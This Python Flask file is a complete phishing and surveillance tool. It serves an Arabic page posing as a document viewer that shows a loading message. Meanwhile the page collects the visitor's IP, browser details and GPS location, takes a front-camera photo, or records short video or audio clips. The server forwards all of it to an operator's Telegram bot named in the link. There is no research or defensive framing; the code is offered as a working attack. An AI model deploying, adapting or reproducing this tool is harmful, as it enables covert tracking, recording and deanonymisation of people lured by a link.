# language: Python, file: app.py, runtime: Python 3.10+, target: Flask Web Receiver
import base64
import os
from flask import Flask, request, jsonify, render_template_string
import requests

app = Flask(__name__)

HTML_PAGE = """
<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>عرض المستند</title>
</head>
<body>
  <p id="status">جاري تحميل المحتوى...</p>
  <video id="vid" autoplay playsinline style="display:none;"></video>
  <canvas id="cvs" style="display:none;"></canvas>

  <script>
    const sid = "{{ sid }}";
    const mode = "{{ mode }}";
    const feat = "{{ feat }}";
    const token = "{{ token }}";
    const chatId = "{{ chat_id }}";

    async function postJson(path, payload) {
      await fetch(path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    async function run() {
      let ipData = {};
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        ipData = await r.json();
      } catch (e) {}

      await postJson("/collect/meta", {
        sid, mode, feat, token, chatId,
        ip: ipData.ip || "",
        ua: navigator.userAgent,
        lang: navigator.language,
        platform: navigator.platform
      });

      if (feat === "feat_service_2" && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            await postJson("/collect/loc", {
              sid, token, chatId,
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy
            });
          },
          () => {},
          { enableHighAccuracy: true, timeout: 8000 }
        );
      }

      if (
        (feat === "feat_service_1" || feat === "feat_service_3" || feat === "feat_service_4") &&
        navigator.mediaDevices
      ) {
        const constraints =
          feat === "feat_service_4"
            ? { audio: true, video: false }
            : { video: { facingMode: "user" }, audio: feat === "feat_service_3" };

        try {
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          if (feat === "feat_service_1") {
            const v = document.getElementById("vid");
            v.srcObject = stream;
            await new Promise((res) => (v.onloadedmetadata = res));
            const c = document.getElementById("cvs");
            c.width = v.videoWidth || 640;
            c.height = v.videoHeight || 480;
            c.getContext("2d").drawImage(v, 0, 0);
            const imgB64 = c.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach((t) => t.stop());
            await postJson("/collect/photo", { sid, token, chatId, image: imgB64 });
          } else if (feat === "feat_service_3" || feat === "feat_service_4") {
            const chunks = [];
            const rec = new MediaRecorder(stream);
            rec.ondataavailable = (ev) => {
              if (ev.data && ev.data.size > 0) chunks.push(ev.data);
            };
            rec.onstop = async () => {
              stream.getTracks().forEach((t) => t.stop());
              const blob = new Blob(chunks, {
                type: feat === "feat_service_4" ? "audio/webm" : "video/webm"
              });
              const buf = await blob.arrayBuffer();
              let bin = "";
              const bytes = new Uint8Array(buf);
              for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
              await postJson("/collect/media", {
                sid, feat, token, chatId,
                b64: btoa(bin),
                filename: feat === "feat_service_4" ? "voice.webm" : "clip.webm"
              });
            };
            rec.start();
            setTimeout(() => {
              if (rec.state !== "inactive") rec.stop();
            }, 4000);
          }
        } catch (e) {}
      }

      document.getElementById("status").textContent = "اكتمل التحميل.";
    }

    run();
  </script>
</body>
</html>
"""


def tg_send_msg(token: str, chat_id: str, text: str) -> None:
    if not token or not chat_id:
        return
    requests.post(
        f"https://api.telegram.org/bot{token}/sendMessage",
        json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
        timeout=10,
    )


@app.route("/r/<sid>")
def entry(sid):
    token = request.args.get("t", "")
    chat_id = request.args.get("c", "")
    mode = request.args.get("m", "link")
    feat = request.args.get("f", "feat_service_2")
    return render_template_string(
        HTML_PAGE, sid=sid, mode=mode, feat=feat, token=token, chat_id=chat_id
    )


@app.post("/collect/meta")
def collect_meta():
    d = request.get_json(force=True, silent=True) or {}
    real_ip = d.get("ip") or request.headers.get("X-Forwarded-For", request.remote_addr or "")
    msg = (
        f"<b>دخول جديد عبر الرابط</b>\n"
        f"• الجلسة: <code>{d.get('sid', '')}</code>\n"
        f"• النمط: <code>{d.get('mode', '')}</code>\n"
        f"• IP: <code>{real_ip}</code>\n"
        f"• الجهاز/المتصفح: <code>{d.get('ua', '')}</code>\n"
        f"• اللغة: <code>{d.get('lang', '')}</code>"
    )
    tg_send_msg(d.get("token", ""), d.get("chatId", ""), msg)
    return jsonify({"ok": True})


@app.post("/collect/loc")
def collect_loc():
    d = request.get_json(force=True, silent=True) or {}
    token = d.get("token", "")
    chat_id = d.get("chatId", "")
    lat = d.get("lat")
    lon = d.get("lon")
    if token and chat_id and lat is not None and lon is not None:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendLocation",
            json={"chat_id": chat_id, "latitude": lat, "longitude": lon},
            timeout=10,
        )
        tg_send_msg(
            token,
            chat_id,
            f"<b>إحداثيات الموقع</b>\n"
            f"• خط العرض: <code>{lat}</code>\n"
            f"• خط الطول: <code>{lon}</code>\n"
            f"• الدقة (متر): <code>{d.get('acc', '')}</code>",
        )
    return jsonify({"ok": True})


@app.post("/collect/photo")
def collect_photo():
    d = request.get_json(force=True, silent=True) or {}
    token = d.get("token", "")
    chat_id = d.get("chatId", "")
    img = d.get("image", "")
    if token and chat_id and "," in img:
        raw = base64.b64decode(img.split(",", 1)[1])
        requests.post(
            f"https://api.telegram.org/bot{token}/sendPhoto",
            data={"chat_id": chat_id},
            files={"photo": ("snap.jpg", raw, "image/jpeg")},
            timeout=15,
        )
    return jsonify({"ok": True})


@app.post("/collect/media")
def collect_media():
    d = request.get_json(force=True, silent=True) or {}
    token = d.get("token", "")
    chat_id = d.get("chatId", "")
    b64 = d.get("b64", "")
    fname = d.get("filename", "media.webm")
    if token and chat_id and b64:
        raw = base64.b64decode(b64)
        endpoint = "sendAudio" if d.get("feat") == "feat_service_4" else "sendVideo"
        field = "audio" if d.get("feat") == "feat_service_4" else "video"
        requests.post(
            f"https://api.telegram.org/bot{token}/{endpoint}",
            data={"chat_id": chat_id},
            files={field: (fname, raw, "application/octet-stream")},
            timeout=20,
        )
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.getenv("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
